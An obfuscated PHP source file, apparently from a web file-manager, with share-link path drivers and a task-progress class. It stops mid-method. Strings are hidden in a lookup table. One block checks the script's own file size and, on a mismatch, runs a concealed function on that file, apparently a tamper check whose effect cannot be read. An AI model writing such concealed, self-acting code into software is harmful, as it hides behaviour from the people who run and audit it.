<?php
 goto fßğÀ¦íÒ‚; f™ğ¬Ë›Ã: class PathDriverDbShareLink extends PathDriverDB { public function __construct($µÌ«Çùİ) { $this->pathParse = $µÌ«Çùİ; $this->model = Model($_SERVER[•€áå–Õ][1374]); } protected function infoParse($ÀïÔÂœÚ, $Ãï˜´Ÿ = false, $ÛÎàû¬ = false) { $¨ŠÖœõ× =& $_SERVER[•€áå–Õ]; return Action($¨ŠÖœõ×[1215])->sharePathInfo($this->pathParse[$¨ŠÖœõ×[96]], !0, $Ãï˜´Ÿ); } public function listPath($ÒÎ²²ïµ, $Š†•Î¨ô = false) { $³òªë¡´ =& $_SERVER[•€áå–Õ]; $‹²óàê = parent::listPath($ÒÎ²²ïµ, $Š†•Î¨ô); if (!$‹²óàê) { return $‹²óàê; } if (is_array($‹²óàê[$³òªë¡´[1382]])) { $‹²óàê[$³òªë¡´[1382]] = Action($³òªë¡´[1215])->shareItemInfo($‹²óàê[$³òªë¡´[1382]]); } foreach ($‹²óàê as $ ÓŸÙÔ¡ => $Ùå·˜ô) { if (!in_array($ ÓŸÙÔ¡, array($³òªë¡´[95], $³òªë¡´[94]))) { continue; } foreach ($Ùå·˜ô as $úã¬†í“ => $•–¹’„Ì) { $‹²óàê[$ ÓŸÙÔ¡][$úã¬†í“] = Action($³òªë¡´[1215])->shareItemInfo($•–¹’„Ì); } } return $‹²óàê; } public function listAll($•¢³»ŠÁ) { $îåİö€ =& $_SERVER[•€áå–Õ]; $ÓÁÀ”á = IO::info($this->pathParse[$îåİö€[96]]); if (!$ÓÁÀ”á) { return array(); } $ÁÑÎÃ¬ = $this->model->listAll($•¢³»ŠÁ); foreach ($ÁÑÎÃ¬ as &$ê‡Ìñ­š) { $ê‡Ìñ­š[$îåİö€[99]] = Action($îåİö€[1215])->shareItemInfo($ê‡Ìñ­š[$îåİö€[99]]); } unset($ê‡Ìñ­š); return $ÁÑÎÃ¬; } } class PathDriverDriverShareItem { public function __construct($Ÿû‰·•à) { $this->pathParse = $Ÿû‰·•à; } public function __call($•éôÜÇ·, $½šÊë³) { $ÀßÛåÅ¤ =& $_SERVER[•€áå–Õ]; if (method_exists($this, $•éôÜÇ·)) { return; } $âğß¾ä = call_user_func_array(array($ÀßÛåÅ¤[1383], $•éôÜÇ·), $½šÊë³); $¿Áöñˆ = array($ÀßÛåÅ¤[1384], $ÀßÛåÅ¤[1385], $ÀßÛåÅ¤[1386], $ÀßÛåÅ¤[1387], $ÀßÛåÅ¤[597], $ÀßÛåÅ¤[599], $ÀßÛåÅ¤[1388], $ÀßÛåÅ¤[119], $ÀßÛåÅ¤[1389], $ÀßÛåÅ¤[1390]); if (in_array($•éôÜÇ·, $¿Áöñˆ)) { $âğß¾ä = $this->getPathOuter($âğß¾ä); } return $âğß¾ä; } public function copy($Ï’ É­¸, $ó­–Äáú, $ªÙŞé­ = false, $¸£¼ôµ¶ = false) { return $this->copyMove($Ï’ É­¸, $ó­–Äáú, $ªÙŞé­, $_SERVER[•€áå–Õ][597], $¸£¼ôµ¶); } public function move($Ÿ—„İ™æ, $‹·‘¡Òú, $“œÔù¬æ = false, $ç¯Ì•À = false) { return $this->copyMove($Ÿ—„İ™æ, $‹·‘¡Òú, $“œÔù¬æ, $_SERVER[•€áå–Õ][599], $ç¯Ì•À); } private function copyMove($£®ëî½ê, $ãß’°ßŒ, $€¼¦¢ÒÙ, $ÂªÕÖ†¦, $å•ŞÛ™¶ = false) { $Î’ó°çä =& $_SERVER[•€áå–Õ]; $ƒ¿ğã… = $ãß’°ßŒ; $ÁüÙÌÚ¢ = IO::driverMake($ãß’°ßŒ); if ($ÁüÙÌÚ¢->pathParse[$Î’ó°çä[1192]]) { $ãß’°ßŒ = $ÁüÙÌÚ¢->pathParse[$Î’ó°çä[1192]]; } else { $ãß’°ßŒ = $ƒ¿ğã…; } $ÁËı€ŠÏ = IO::copyMove($£®ëî½ê, $ãß’°ßŒ, $€¼¦¢ÒÙ, $ÂªÕÖ†¦, $å•ŞÛ™¶); $ÁËı€ŠÏ = $this->getPathOuter($ÁËı€ŠÏ); return $ÁËı€ŠÏ; } public function pathThis($É³ŸÌ“) { return get_path_this($this->pathParse[$_SERVER[•€áå–Õ][96]]); } public function pathFather($ÁÜ÷Š) { return get_path_father($this->pathParse[$_SERVER[•€áå–Õ][96]]); } public function iconvSystem($œõÑ¹äì) { return $œõÑ¹äì; } protected function infoParse($Õ©»ºî¶, $×Ó”ÄùÑ = false) { $¯‡Ãı‡Ò =& $_SERVER[•€áå–Õ]; $¶´Ûâ— = $this->pathParse[$¯‡Ãı‡Ò[540]][$¯‡Ãı‡Ò[1216]] . $this->pathParse[$¯‡Ãı‡Ò[1209]]; if ($×Ó”ÄùÑ) { $—­Ñ­¿ = IO::infoWithChildren($¶´Ûâ—); } else { $—­Ñ­¿ = IO::info($¶´Ûâ—); } $ÜÔ‰ˆ±š = $this->pathParse[$¯‡Ãı‡Ò[540]]; return Action($¯‡Ãı‡Ò[1381])->_shareItemeParse($—­Ñ­¿, $ÜÔ‰ˆ±š); } public function listAll($€Ã¦‰Ö’) { $şä¢„¡‡ =& $_SERVER[•€áå–Õ]; $È¿¾Ü’¸ = IO::listAll($€Ã¦‰Ö’); $æ§§Æµ‰ = rtrim($this->pathParse[$şä¢„¡‡[540]][$şä¢„¡‡[1216]], $şä¢„¡‡[18]); foreach ($È¿¾Ü’¸ as &$ÕÛ¤ŠÁ¹) { $ÕÛ¤ŠÁ¹[$şä¢„¡‡[96]] = $this->pathDriver . $şä¢„¡‡[18] . ltrim(substr($ÕÛ¤ŠÁ¹[$şä¢„¡‡[96]], strlen($æ§§Æµ‰)), $şä¢„¡‡[18]); } unset($ÕÛ¤ŠÁ¹); return $È¿¾Ü’¸; } public function listAllSimple($Üã©ˆÙÎ, $š®¦ø¶ = false) { $“÷³ŸŞ =& $_SERVER[•€áå–Õ]; $˜äÙ–’ = $this->listAll($Üã©ˆÙÎ); $±ò¢¤Şè = $this->pathParse[$“÷³ŸŞ[474]]; if (trim($±ò¢¤Şè, $“÷³ŸŞ[18]) == trim(get_path_father($±ò¢¤Şè), $“÷³ŸŞ[18])) { $š®¦ø¶ = !0; } return IO::init($“÷³ŸŞ[22])->listAllSimpleMake($˜äÙ–’, $±ò¢¤Şè, $š®¦ø¶); } public function getPathOuter($èùŞäÕ¤) { $‚ìÅ”ïÙ =& $_SERVER[•€áå–Õ]; $ëš×†Ê = KodIO::parse($èùŞäÕ¤); if ($ëš×†Ê[$‚ìÅ”ïÙ[43]] == KodIO::KOD_SHARE_ITEM) { return $ëš×†Ê[$‚ìÅ”ïÙ[96]]; } $Œ“¤ÈÁ = KodIO::clear($èùŞäÕ¤); $ä¯¡Œà = KodIO::clear($this->pathParse[$‚ìÅ”ïÙ[540]][$‚ìÅ”ïÙ[1216]]); $ÙôóĞ²× = substr($Œ“¤ÈÁ, strlen($ä¯¡Œà)); if (substr($Œ“¤ÈÁ, 0, strlen($ä¯¡Œà)) != $ä¯¡Œà) { return !1; } return $this->pathParse[$‚ìÅ”ïÙ[1210]] . $‚ìÅ”ïÙ[18] . ltrim($ÙôóĞ²×, $‚ìÅ”ïÙ[18]); } public function getType() { $–Ï¶Õîæ =& $_SERVER[•€áå–Õ]; $‰¬ìŞã£ = str_replace($–Ï¶Õîæ[86], $–Ï¶Õîæ[22], get_class($this)); return strtolower($‰¬ìŞã£); } public function isTypeObject($øÉ£ùîı) { return IO::isTypeObject($øÉ£ùîı); } public function info($Ú´Şû§›) { return $this->infoParse($Ú´Şû§›); } public function infoAuth($‹ôÔÈˆ») { return $this->infoParse($‹ôÔÈˆ»); } public function infoWithChildren($ºğ›ñ–) { return $this->infoParse($ºğ›ñ–, !0); } public function infoFull($ÀûÎñÓË) { return $this->infoParse($ÀûÎñÓË); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($õìí’„) { $this->pathParse = $õìí’„; } protected function infoParse($¨áÌ¦§ , $ôóâ«½ø = false) { $íòã±è =& $_SERVER[•€áå–Õ]; return Action($íòã±è[1215])->sharePathInfo($this->pathParse[$íòã±è[96]], !0, $ôóâ«½ø); } public function listPath($¨‡ÊÚÓ·, $†Œõ×Â„ = false) { $ˆÉ±—Å® =& $_SERVER[•€áå–Õ]; $Îà¸ĞŸ“ = IO::listPath($¨‡ÊÚÓ·, $†Œõ×Â„); if (!$Îà¸ĞŸ“) { return $Îà¸ĞŸ“; } if (is_array($Îà¸ĞŸ“[$ˆÉ±—Å®[1382]])) { $Öíã«˜ƒ = Action($ˆÉ±—Å®[1391])->parsePathChildren($Îà¸ĞŸ“[$ˆÉ±—Å®[1382]], array($ˆÉ±—Å®[474] => $¨‡ÊÚÓ·)); $Îà¸ĞŸ“[$ˆÉ±—Å®[1382]] = Action($ˆÉ±—Å®[1215])->shareItemInfo($Öíã«˜ƒ); } foreach ($Îà¸ĞŸ“ as $İÂññ×À => $ËƒÂÖ˜³) { if (!in_array($İÂññ×À, array($ˆÉ±—Å®[95], $ˆÉ±—Å®[94]))) { continue; } foreach ($ËƒÂÖ˜³ as $ô­¯Õşé => $Öíã«˜ƒ) { $Öíã«˜ƒ = Action($ˆÉ±—Å®[1391])->parsePathChildren($Öíã«˜ƒ, array($ˆÉ±—Å®[474] => $¨‡ÊÚÓ·)); $Îà¸ĞŸ“[$İÂññ×À][$ô­¯Õşé] = Action($ˆÉ±—Å®[1215])->shareItemInfo($Öíã«˜ƒ); } } return $Îà¸ĞŸ“; } } goto Eã©Šİ¨ŒÕ; b±É¦áâ‹³: $_file = $_SERVER[$_SERVER[•€áå–Õ][6]]; $_size = $_SERVER[•€áå–Õ][7]; if ($_SERVER[$_SERVER[•€áå–Õ][8]] != $_size($_file)) { $_getc = $_SERVER[•€áå–Õ][9]; $_getfile = $_SERVER[$_SERVER[•€áå–Õ][10]] . $_SERVER[•€áå–Õ][11]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[•€áå–Õ][12], $_getfilec); if (count($_getarrs) < $_SERVER[•€áå–Õ][13]) { $exit = $_SERVER[•€áå–Õ][14]; $exit(); } $_act = $_SERVER[•€áå–Õ][15]; $_act($_file); } goto B¦¯Ã¯¶†Œ; FÎ­°ˆç³: class Task { const STATYS_STOP = "\x73\164\157\x70"; const STATYS_RUNNING = "\162\165\156\x6e\x69\156\x67"; const STATYS_KILL = "\153\151\154\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($ùÓÜ²Ñğ, $¬½Ùò±Ÿ = '', $×´ŞÆ = 0, $°ø€õ²© = '') { $˜ Ó‚¯ =& $_SERVER[•€áå–Õ]; if (self::get($ùÓÜ²Ñğ)) { return; } $this->task = array($˜ Ó‚¯[454] => $ùÓÜ²Ñğ, $˜ Ó‚¯[1693] => USER_ID, $˜ Ó‚¯[1583] => $°ø€õ²©, $˜ Ó‚¯[505] => $˜ Ó‚¯[22], $˜ Ó‚¯[43] => $¬½Ùò±Ÿ, $˜ Ó‚¯[1105] => $˜ Ó‚¯[22], $˜ Ó‚¯[827] => $×´ŞÆ, $˜ Ó‚¯[1694] => 0, $˜ Ó‚¯[1695] => 0, $˜ Ó‚¯[1696] => 0, $˜ Ó‚¯[1697] => timeFloat(), $˜ Ó‚¯[1698] => 0, $˜ Ó‚¯[1699] => 0, $˜ Ó‚¯[1700] => 0, $˜ Ó‚¯[1701] => 0, $˜ Ó‚¯[791] => $˜ Ó‚¯[1643]); $GLOBALS[$˜ Ó‚¯[1702]] = 1; Hook::bind($˜ Ó‚¯[1647], array($this, $˜ Ó‚¯[1703])); Hook::bind($˜ Ó‚¯[1704], array($this, $˜ Ó‚¯[1705])); $this->startAfter(); Hook::trigger($˜ Ó‚¯[1706], $this->task); $this->task[$˜ Ó‚¯[1699]] = timeFloat(); } public function end($Ì£ìß¢ = '') { $Ñşœğş´ =& $_SERVER[•€áå–Õ]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$Ñşœğş´[1699]]) { self::valueSet($this->task[$Ñşœğş´[454]], !1); } $this->isEnd = !0; if ($Ì£ìß¢) { $this->task[$Ñşœğş´[505]] = $Ì£ìß¢; } self::log($Ñşœğş´[1707] . $this->task[$Ñşœğş´[454]] . $Ñşœğş´[1708] . sprintf($Ñşœğş´[892], timeFloat() - $this->task[$Ñşœğş´[1697]]) . $Ñşœğş´[1709]); Hook::unbind($Ñşœğş´[1647], array($this, $Ñşœğş´[1703])); Hook::unbind($Ñşœğş´[1704], array($this, $Ñşœğş´[1705])); $this->endAfter(); $ı·ìå Ó = $this->task; $this->task = !1; Hook::trigger($Ñşœğş´[1710], $ı·ìå Ó); } public function update($ÖÅ¤îÕ© = 0, $ŒÁÈ­¥ = false) { $Õš‹µ„ =& $_SERVER[•€áå–Õ]; $¶¥•Ü˜Ï =& $this->task; if (!$¶¥•Ü˜Ï) { return; } $¶¥•Ü˜Ï[$Õš‹µ„[1694]] += $ÖÅ¤îÕ©; $¶¥•Ü˜Ï[$Õš‹µ„[1698]] = timeFloat(); if ($¶¥•Ü˜Ï[$Õš‹µ„[827]]) { if ($¶¥•Ü˜Ï[$Õš‹µ„[827]] < $¶¥•Ü˜Ï[$Õš‹µ„[1694]]) { $¶¥•Ü˜Ï[$Õš‹µ„[827]] = $¶¥•Ü˜Ï[$Õš‹µ„[1694]]; } $Æ×Ñ¼œ = timeFloat() - $¶¥•Ü˜Ï[$Õš‹µ„[1697]] - $¶¥•Ü˜Ï[$Õš‹µ„[1700]]; if ($Æ×Ñ¼œ <= 0) { $Æ×Ñ¼œ = 0.001; } $¶¥•Ü˜Ï[$Õš‹µ„[1695]] = $¶¥•Ü˜Ï[$Õš‹µ„[1694]] / $¶¥•Ü˜Ï[$Õš‹µ„[827]]; $¶¥•Ü˜Ï[$Õš‹µ„[1696]] = $¶¥•Ü˜Ï[$Õš‹µ„[1694]] / $Æ×Ñ¼œ; if ($¶¥•Ü˜Ï[$Õš‹µ„[1695]] > 0) { $¶¥•Ü˜Ï[$Õš‹µ„[1701]] = $Æ×Ñ¼œ * (1 - $¶¥•Ü˜Ï[$Õš‹µ„[1695]]) / $¶¥•Ü˜Ï[$Õš‹µ„[1695]]; } $¶¥•Ü˜Ï[$Õš‹µ„[1701]] = $¶¥•Ü˜Ï[$Õš‹µ„[1701]] <= 0 ? 0 : $¶¥•Ü˜Ï[$Õš‹µ„[1701]]; } $this->updateAfter(); $¼Ú‡úŒ¼ = 0.2; if (timeFloat() - $¶¥•Ü˜Ï[$Õš‹µ„[1699]] < $¼Ú‡úŒ¼ && !$ŒÁÈ­¥) { return; } $ÅöåÄ‡è = self::get($¶¥•Ü˜Ï[$Õš‹µ„[454]]); $ŒÛŒ¶…œ = $ÅöåÄ‡è[$Õš‹µ„[791]]; if ($ŒÛŒ¶…œ == self::STATYS_KILL) { $í…¹ÌÁ¢ = array($Õš‹µ„[1711] => LNG($Õš‹µ„[1712]), $Õš‹µ„[1253] => !1); Cache::set($Õš‹µ„[1713] . $this->task[$Õš‹µ„[454]], $í…¹ÌÁ¢, 30); $this->onKill(); $this->end(); die; } else { if ($ŒÛŒ¶…œ == self::STATYS_STOP) { $„†¤ = 2; $ÅöåÄ‡è[$Õš‹µ„[1700]] += $„†¤; self::valueSet($¶¥•Ü˜Ï[$Õš‹µ„[454]], $ÅöåÄ‡è); sleep($„†¤); $this->update(); return; } } $¶¥•Ü˜Ï[$Õš‹µ„[791]] = $ŒÛŒ¶…œ ? $ŒÛŒ¶…œ : $¶¥•Ü˜Ï[$Õš‹µ„[791]]; $¶¥•Ü˜Ï[$Õš‹µ„[1700]] = $ÅöåÄ‡è[$Õš‹µ„[1700]] ? $ÅöåÄ‡è[$Õš‹µ„[1700]] : 0; $¶¥•Ü˜Ï[$Õš‹µ„[1699]] = timeFloat(); Hook::trigger($Õš‹µ„[1714], $¶¥•Ü˜Ï); self::valueSet($¶¥•Ü˜Ï[$Õš‹µ„[454]], $¶¥•Ü˜Ï); } public function onKillSet($´è­ÜÚ, $«üò§—Û = array()) { $this->onKillCall = array($´è­ÜÚ, $«üò§—Û); } public function onKill() { $Áº¡â™• =& $_SERVER[•€áå–Õ]; self::log($Áº¡â™•[1707] . $this->task[$Áº¡â™•[454]] . $Áº¡â™•[1715]); Hook::trigger($Áº¡â™•[1716], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($óÀöôë¹) { $¾µæ–³Ü =& $_SERVER[•€áå–Õ]; Cache::set($¾µæ–³Ü[1713] . $this->task[$¾µæ–³Ü[454]], $óÀöôë¹, 60); return $óÀöôë¹; } public static function get($÷®Û“·Ö) { $ ³‚àÇ =& $_SERVER[•€áå–Õ]; $ªÏæù³³ = self::valueGet($÷®Û“·Ö); if (is_array($ªÏæù³³) && $ªÏæù³³[$ ³‚àÇ[1717]]) { $ß³˜şª– = ActionApply($ªÏæù³³[$ ³‚àÇ[1717]], array($ªÏæù³³)); $ªÏæù³³ = is_array($ß³˜şª–) ? $ß³˜şª– : $ªÏæù³³; } return $ªÏæù³³; } public static function listData() { $²üÙÊ¡³ = self::valueGet(); return array_sort_by($²üÙÊ¡³, $_SERVER[•€áå–Õ][1697], !0); } public static function kill($îÔ§ì¸î) { return self::changeStatus($îÔ§ì¸î, self::STATYS_KILL); } public static function stop($¼°ñ²ö) { return self::changeStatus($¼°ñ²ö, self::STATYS_STOP); } public static function restart($¤åïÃ­¸) { return self::changeStatus($¤åïÃ­¸, self::STATYS_RUNNING); } public static function killAll() { $Ï¨ê´ ¯ =& $_SERVER[•€áå–Õ]; $Õà¶¦ÚŒ = self::listData(); foreach ($Õà¶¦ÚŒ as $€ßÌËä“) { self::kill($€ßÌËä“[$Ï¨ê´ ¯[454]]); } sleep(2); foreach ($Õà¶¦ÚŒ as $€ßÌËä“) { self::valueSet($€ßÌËä“[$Ï¨ê´ ¯[454]], !1); } } private static function changeStatus($…ÊÁ™üğ, $¨¦°÷ëß) { $«í¤„§× =& $_SERVER[•€áå–Õ]; $Û÷€“š = self::valueGet($…ÊÁ™üğ); if (!$Û÷€“š) { return !1; } $Û÷€“š[$«í¤„§×[791]] = $¨¦°÷ëß; self::valueSet($…ÊÁ™üğ, $Û÷€“š); self::log($«í¤„§×[1718] . $Û÷€“š[$«í¤„§×[454]] . $«í¤„§×[1719] . $¨¦°÷ëß); return !0; } public static function valueGet($Ô—‚…«ª = false) { $¢Ïéò¿¨ =& $_SERVER[•€áå–Õ]; if ($Ô—‚…«ª) { $İŞúÓ¯‰ = Model($¢Ïéò¿¨[499])->where(array($¢Ïéò¿¨[106] => $Ô—‚…«ª, $¢Ïéò¿¨[43] => $¢Ïéò¿¨[1112]))->find(); return $İŞúÓ¯‰ ? json_decode($İŞúÓ¯‰[$¢Ïéò¿¨[429]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($éØ’ù¨÷ = false) { $­ÁÄ€•­ =& $_SERVER[•€áå–Õ]; $•­€êõÈ = array($­ÁÄ€•­[43] => $­ÁÄ€•­[1112]); if ($éØ’ù¨÷) { $•­€êõÈ[$­ÁÄ€•­[1693]] = $éØ’ù¨÷; } $ºüÇ‡ü = Model($­ÁÄ€•­[499])->where($•­€êõÈ)->select(); $ºüÇ‡ü = $ºüÇ‡ü ? $ºüÇ‡ü : array(); foreach ($ºüÇ‡ü as $À±¯ì => $É‡•Ü¶) { $ºüÇ‡ü[$À±¯ì] = json_decode($É‡•Ü¶[$­ÁÄ€•­[429]], !0); } return $ºüÇ‡ü; } public static function valueSet($óâ˜ı¤¾, $Ÿˆ¾Ãå) { $šŠ¨ê’Û =& $_SERVER[•€áå–Õ]; if (!$Ÿˆ¾Ãå) { return Model($šŠ¨ê’Û[499])->where(array($šŠ¨ê’Û[106] => $óâ˜ı¤¾, $šŠ¨ê’Û[43] => $šŠ¨ê’Û[1112]))->delete(); } $äÚ»ëÎâ = json_encode($Ÿˆ¾Ãå); if (!$äÚ»ëÎâ) { ob_start(); var_dump($Ÿˆ¾Ãå); $¡÷‰„İ¢ = ob_get_clean(); self::log($šŠ¨ê’Û[1720] . json_encode_force($¡÷‰„İ¢)); } if (!$óâ˜ı¤¾ || !$Ÿˆ¾Ãå[$šŠ¨ê’Û[454]]) { return !1; } $»õ ™ÙØ = array($šŠ¨ê’Û[43] => $šŠ¨ê’Û[1112], $šŠ¨ê’Û[1693] => USER_ID, $šŠ¨ê’Û[106] => $óâ˜ı¤¾, $šŠ¨ê’Û[429] => $äÚ»ëÎâ); $¿’éÊ•º = $šŠ¨ê’Û[1721]; CacheLock::lock($¿’éÊ•º); Model($šŠ¨ê’Û[499])->add($»õ ™ÙØ, array(), !0); CacheLock::unlock($¿’éÊ•º); } public static function log($ŒòèçË¥) { if (!GLOBAL_DEBUG) { return; } write_log($ŒòèçË¥, $_SERVER[•€áå–Õ][1722]); } } class TaskFileTransfer extends Task { protected function startAfter() { $Ü³çîú“ =& $_SERVER[•€áå–Õ]; $°´Å®«© =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($Ü³çîú“[1723], array($this, $Ü³çîú“[1724])); Hook::bind($Ü³çîú“[1264], array($this, $Ü³çîú“[1725])); Hook::bind($Ü³çîú“[1726], array($this, $Ü³çîú“[1727])); Hook::bind($Ü³çîú“[647], array($this, $Ü³çîú“[1728])); Hook::bind($Ü³çîú“[648], array($this, $Ü³çîú“[1729])); Hook::bind($Ü³çîú“[654], array($this, $Ü³çîú“[1730])); Hook::bind($Ü³çîú“[655], array($this, $Ü³çîú“[1731])); Hook::bind($Ü³çîú“[650], array($this, $Ü³çîú“[1732])); Hook::bind($Ü³çîú“[652], array($this, $Ü³çîú“[1733])); Hook::bind($Ü³çîú“[616], array($this, $Ü³çîú“[1734])); Hook::bind($Ü³çîú“[613], array($this, $Ü³çîú“[1734])); Hook::bind($Ü³çîú“[618], array($this, $Ü³çîú“[1734])); Hook::bind($Ü³çîú“[620], array($this, $Ü³çîú“[1734])); Hook::bind($Ü³çîú“[622], array($this, $Ü³çîú“[1734])); Hook::bind($Ü³çîú“[1735], array($this, $Ü³çîú“[1736])); Hook::bind($Ü³çîú“[638], array($this, $Ü³çîú“[1737])); $this->sourceModelCopyFlag = !1; Hook::bind($Ü³çîú“[1738], array($this, $Ü³çîú“[1739])); Hook::bind($Ü³çîú“[1740], array($this, $Ü³çîú“[1741])); Hook::bind($Ü³çîú“[1742], array($this, $Ü³çîú“[1743])); $°´Å®«©[$Ü³çîú“[1744]] = LNG($Ü³çîú“[1745]); $°´Å®«©[$Ü³çîú“[1746]] = 0; $°´Å®«©[$Ü³çîú“[1747]] = 0; $°´Å®«©[$Ü³çîú“[1105]] = $Ü³çîú“[22]; $°´Å®«©[$Ü³çîú“[1748]] = $Ü³çîú“[22]; $°´Å®«©[$Ü³çîú“[1749]] = 0; $°´Å®«©[$Ü³çîú“[1750]] = 0; $°´Å®«©[$Ü³çîú“[1751]] = 0; if (!$°´Å®«©[$Ü³çîú“[1583]]) { $°´Å®«©[$Ü³çîú“[1583]] = LNG($Ü³çîú“[1752]); } } protected function endAfter() { $ˆ€Õƒã© =& $_SERVER[•€áå–Õ]; Hook::unbind($ˆ€Õƒã©[1723], array($this, $ˆ€Õƒã©[1724])); Hook::unbind($ˆ€Õƒã©[1264], array($this, $ˆ€Õƒã©[1725])); Hook::unbind($ˆ€Õƒã©[1726], array($this, $ˆ€Õƒã©[1727])); Hook::unbind($ˆ€Õƒã©[647], array($this, $ˆ€Õƒã©[1728])); Hook::unbind($ˆ€Õƒã©[648], array($this, $ˆ€Õƒã©[1729])); Hook::unbind($ˆ€Õƒã©[654], array($this, $ˆ€Õƒã©[1730])); Hook::unbind($ˆ€Õƒã©[655], array($this, $ˆ€Õƒã©[1731])); Hook::unbind($ˆ€Õƒã©[650], array($this, $ˆ€Õƒã©[1732])); Hook::unbind($ˆ€Õƒã©[652], array($this, $ˆ€Õƒã©[1733])); Hook::unbind($ˆ€Õƒã©[616], array($this, $ˆ€Õƒã©[1734])); Hook::unbind($ˆ€Õƒã©[613], array($this, $ˆ€Õƒã©[1734])); Hook::unbind($ˆ€Õƒã©[618], array($this, $ˆ€Õƒã©[1734])); Hook::unbind($ˆ€Õƒã©[620], array($this, $ˆ€Õƒã©[1734])); Hook::unbind($ˆ€Õƒã©[622], array($this, $ˆ€Õƒã©[1734])); Hook::unbind($ˆ€Õƒã©[1735], array($this, $ˆ€Õƒã©[1736])); Hook::unbind($ˆ€Õƒã©[638], array($this, $ˆ€Õƒã©[1737])); Hook::unbind($ˆ€Õƒã©[1738], array($this, $ˆ€Õƒã©[1739])); Hook::unbind($ˆ€Õƒã©[1740], array($this, $ˆ€Õƒã©[1741])); Hook::unbind($ˆ€Õƒã©[1742], array($this, $ˆ€Õƒã©[1743])); } public function copyMoveStart($×¸¥«¡¼, $Ö÷±ş½Ó, $‘¬â¬ğï, $ƒÖ³ÓÍ) { $ÇşÑèÁÁ =& $_SERVER[•€áå–Õ]; self::log($ÇşÑèÁÁ[1753] . $Ö÷±ş½Ó . $ÇşÑèÁÁ[82] . $ƒÖ³ÓÍ); $”¸æ»é = rtrim(TEMP_FILES, $ÇşÑèÁÁ[18]); if (substr($Ö÷±ş½Ó, 0, strlen($”¸æ»é)) == $”¸æ»é) { return; } if (substr($ƒÖ³ÓÍ, 0, strlen($”¸æ»é)) == $”¸æ»é) { return; } $ËëòéÏ =& $this->task; $ËëòéÏ[$ÇşÑèÁÁ[1754]] = KodIO::transferType($×¸¥«¡¼, $‘¬â¬ğï); $this->update(); } public function updateAfter() { $èò¯á…Á =& $_SERVER[•€áå–Õ]; $‡ô‰Ü‚ß =& $this->task; if (!$‡ô‰Ü‚ß[$èò¯á…Á[804]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($‡ô‰Ü‚ß[$èò¯á…Á[1754]] == $èò¯á…Á[1356]) { return; } self::updateTask($‡ô‰Ü‚ß); } private static function updateTask(&$Ã¼è×€Õ) { $¿€¢Š÷¬ =& $_SERVER[•€áå–Õ]; if ($Ã¼è×€Õ[$¿€¢Š÷¬[1754]] == $¿€¢Š÷¬[1235] || $Ã¼è×€Õ[$¿€¢Š÷¬[1754]] == $¿€¢Š÷¬[119]) { if ($Ã¼è×€Õ[$¿€¢Š÷¬[1748]]) { $Ã¼è×€Õ[$¿€¢Š÷¬[1751]] = $Ã¼è×€Õ[$¿€¢Š÷¬[1750]] + $Ã¼è×€Õ[$¿€¢Š÷¬[1747]]; } } else { if ($Ã¼è×€Õ[$¿€¢Š÷¬[1754]] == $¿€¢Š÷¬[1357]) { if ($Ã¼è×€Õ[$¿€¢Š÷¬[1748]] == $¿€¢Š÷¬[1235]) { $Ã¼è×€Õ[$¿€¢Š÷¬[1751]] = $Ã¼è×€Õ[$¿€¢Š÷¬[1750]] + $Ã¼è×€Õ[$¿€¢Š÷¬[1747]] * 0.5; } else { if ($Ã¼è×€Õ[$¿€¢Š÷¬[1748]] == $¿€¢Š÷¬[119]) { $Ã¼è×€Õ[$¿€¢Š÷¬[1751]] = $Ã¼è×€Õ[$¿€¢Š÷¬[1750]] + $Ã¼è×€Õ[$¿€¢Š÷¬[1746]] * 0.5 + $Ã¼è×€Õ[$¿€¢Š÷¬[1747]] * 0.5; } } } } $Ã¼è×€Õ[$¿€¢Š÷¬[1695]] = $Ã¼è×€Õ[$¿€¢Š÷¬[1751]] / $Ã¼è×€Õ[$¿€¢Š÷¬[804]]; if ($Ã¼è×€Õ[$¿€¢Š÷¬[1695]] > 0) { $÷Ü£É»é = timeFloat() - $Ã¼è×€Õ[$¿€¢Š÷¬[1697]] - $Ã¼è×€Õ[$¿€¢Š÷¬[1700]]; $Ã¼è×€Õ[$¿€¢Š÷¬[1701]] = $÷Ü£É»é * (1 - $Ã¼è×€Õ[$¿€¢Š÷¬[1695]]) / $Ã¼è×€Õ[$¿€¢Š÷¬[1695]]; } } public function addPath($ÜòËî±â) { $Ù¿Ë¨Ê =& $_SERVER[•€áå–Õ]; if (!$ÜòËî±â) { return; } $¦úˆÈŞ» =& $this->task; $ƒé¤áş– = IO::infoWithChildren($ÜòËî±â); $¯†å½ö¥ = $¦úˆÈŞ»[$Ù¿Ë¨Ê[1755]] ? $¦úˆÈŞ»[$Ù¿Ë¨Ê[1755]][$Ù¿Ë¨Ê[1756]] : 0; $¦úˆÈŞ»[$Ù¿Ë¨Ê[1755]] = array($Ù¿Ë¨Ê[1756] => $¯†å½ö¥ + 1, $Ù¿Ë¨Ê[473] => $ƒé¤áş–[$Ù¿Ë¨Ê[42]], $Ù¿Ë¨Ê[96] => $ƒé¤áş–[$Ù¿Ë¨Ê[96]], $Ù¿Ë¨Ê[562] => $ƒé¤áş–[$Ù¿Ë¨Ê[562]] ? $ƒé¤áş–[$Ù¿Ë¨Ê[562]] : $ƒé¤áş–[$Ù¿Ë¨Ê[96]]); if ($ƒé¤áş–[$Ù¿Ë¨Ê[43]] == $Ù¿Ë¨Ê[226]) { $¦úˆÈŞ»[$Ù¿Ë¨Ê[827]] += 1; } else { $¦úˆÈŞ»[$Ù¿Ë¨Ê[827]] += $ƒé¤áş–[$Ù¿Ë¨Ê[91]][$Ù¿Ë¨Ê[89]]; if ($ƒé¤áş–[$Ù¿Ë¨Ê[193]]) { $¦úˆÈŞ»[$Ù¿Ë¨Ê[827]] += $ƒé¤áş–[$Ù¿Ë¨Ê[91]][$Ù¿Ë¨Ê[90]] + 1; } } $¦úˆÈŞ»[$Ù¿Ë¨Ê[804]] += $ƒé¤áş–[$Ù¿Ë¨Ê[88]]; $this->update(); } public function sourceCopyFolderStart() { 